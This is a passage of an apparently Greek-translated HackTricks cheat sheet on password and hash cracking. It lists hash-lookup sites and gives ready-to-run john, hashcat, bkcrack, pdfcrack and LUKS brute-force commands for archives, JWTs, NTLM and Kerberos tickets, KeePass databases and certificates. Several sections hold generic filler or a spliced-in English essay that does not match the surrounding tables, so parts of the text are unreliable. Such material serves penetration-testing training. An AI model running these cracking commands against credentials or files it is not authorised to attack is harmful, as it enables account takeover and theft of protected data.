### Online βάσεις δεδομένων αποκρυπτογράφησης

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 με/χωρίς ESS/SSP και με οποιαδήποτε τιμή πρόκλησης)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Κρυπτογραφημένα hashes, αιχμές WPA2, και αρχεία MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Κρυπτογραφημένα hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Κρυπτογραφημένα hashes και αρχεία)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Κρυπτογραφημένα hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Κρυπτογραφημένα hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Ελέγξτε αυτό πριν δοκιμάσετε να εκτελέσετε μια επίθεση brute force σε ένα Hash.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Επίθεση γνωστού κειμένου σε αρχείο zip

Χρειάζεστε να γνωρίζετε το **καθαρό κείμενο** (ή μέρος του καθαρού κειμένου) **ενός αρχείου που περιέχεται μέσα** στο κρυπτογραφημένο zip. Μπορείτε να ελέγξετε τα **ονόματα αρχείων και το μέγεθος των αρχείων που περιέχονται μέσα** σε ένα κρυπτογραφημένο zip τρέχοντας: **`7z l encrypted.zip`**\
Κατεβάστε το [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) από τη σελίδα κυκλοφορίας.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

#### Επίθεση Brute Force

Η επίθεση Brute Force είναι μια τεχνική που στοχεύει στο να δοκιμάσει όλους τους πιθανούς συνδυασμούς κωδικών πρόσβασης μέχρι να βρει το σωστό. Στην περίπτωση του 7z, μπορεί να χρησιμοποιηθεί για να αποκρυπτογραφήσει αρχεία που είναι κρυπτογραφημένα με κωδικό πρόσβασης. Οι επιθέσεις Brute Force μπορεί να είναι χρονοβόρες, αλλά με τη χρήση ισχυρών υπολογιστικών πόρων μπορεί να είναι επιτυχημένες.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

Η επίθεση με βίαιη εξαναγκαστική δύναμη είναι μια τεχνική που χρησιμοποιείται για την ανάλυση των κωδικών πρόσβασης με τη δοκιμή όλων των πιθανών συνδυασμών. Αυτή η μέθοδος είναι αποτελεσματική αλλά χρονοβόρα, καθώς απαιτεί τη δοκιμή όλων των πιθανών συνδυασμών κωδικών.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Κωδικός Ιδιοκτήτη PDF

Για να σπάσετε έναν κωδικό ιδιοκτήτη PDF, ελέγξτε αυτό: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Αποκωδικοποίηση NTLM
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Εικόνα Lucks

#### Μέθοδος 1

Εγκατάσταση: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Μέθοδος 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Άλλο ένα οδηγός Luks BF: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Ιδιωτικό κλειδί PGP/GPG
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Χρησιμοποιήστε [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) και στη συνέχεια το john

### Open Office Pwd Protected Column

Αν έχετε ένα αρχείο xlsx με μια στήλη που προστατεύεται με κωδικό πρόσβασης μπορείτε να την καταργήσετε:

* **Ανεβάστε το στο google drive** και ο κωδικός πρόσβασης θα αφαιρεθεί αυτόματα
* Για να τον **καταργήσετε** **χειροκίνητα**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Πιστοποιητικά PFX
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της παγκόσμιας κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Εργαλεία

**Παραδείγματα κατακερματισμού:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Αναγνωριστής κατακερματισμού
```bash
hash-identifier
> <HASH>
```
### Λίστες Λέξεων

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Εργαλεία Δημιουργίας Λιστών Λέξεων**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Γεννήτρια περιπάτου πληκτρολογίου με προηγμένες ρυθμίσεις βασικών χαρακτήρων, χαρτογράφηση πλήκτρων και διαδρομές.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John μετάλλαξη

Διαβάστε _**/etc/john/john.conf**_ και ρυθμίστε το.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Επιθέσεις Hashcat

* **Επίθεση με λίστα λέξεων** (`-a 0`) με κανόνες

**Το Hashcat** έρχεται ήδη με ένα **φάκελο που περιέχει κανόνες** αλλά μπορείτε να βρείτε [**άλλους ενδιαφέροντες κανόνες εδώ**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Επίθεση με συνδυασμό λιστών λέξεων**

Είναι δυνατόν να **συνδυάσετε 2 λίστες λέξεων σε 1** με το hashcat.\
Αν η λίστα 1 περιείχε τη λέξη **"hello"** και η δεύτερη περιείχε 2 γραμμές με τις λέξεις **"world"** και **"earth"**. Οι λέξεις `helloworld` και `helloearth` θα δημιουργηθούν.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Επίθεση μάσκας** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Λίστα λέξεων + Μάσκα (`-a 6`) / Μάσκα + Λίστα λέξεων (`-a 7`) επίθεση
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Τρόποι Hashcat
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
## Brute Forcing

Brute forcing is a common technique used to crack passwords by systematically attempting all possible combinations of characters until the correct one is found. In the context of cracking Linux hashes from the `/etc/shadow` file, brute forcing involves generating potential passwords and hashing them using the same algorithm as the target system. These hashes are then compared with the target hash to find a match. This method can be resource-intensive and time-consuming, especially for complex passwords.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
## Brute Forcing Windows Hashes

### Introduction

Brute forcing Windows hashes involves using automated tools to try all possible combinations of characters to crack the password hash. This is a common technique used by hackers to gain unauthorized access to Windows systems.

### Methodology

1. **Capture Hash**: Obtain the password hash from the Windows system.
2. **Wordlist Attack**: Use a wordlist containing commonly used passwords to try and crack the hash.
3. **Brute Force Attack**: If the wordlist attack fails, use a brute force attack to systematically try all possible combinations of characters until the correct password is found.
4. **Rainbow Tables**: In some cases, rainbow tables can be used to crack Windows hashes more quickly than traditional brute force methods.

### Tools

- **Hashcat**: A popular password cracking tool that supports various hash algorithms.
- **John the Ripper**: Another powerful password cracking tool that can be used for Windows hashes.
- **CrackStation**: An online database of pre-computed hashes that can be used for hash cracking.

### Conclusion

Brute forcing Windows hashes can be a time-consuming process, especially if the password is complex. It is important for system administrators to use strong, unique passwords to prevent unauthorized access to Windows systems.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
## Αποκωδικοποίηση Συνηθισμένων Κατακερματισμένων Εφαρμογών
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε εύκολα και να **αυτοματοποιήσετε ροές εργασίας** με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
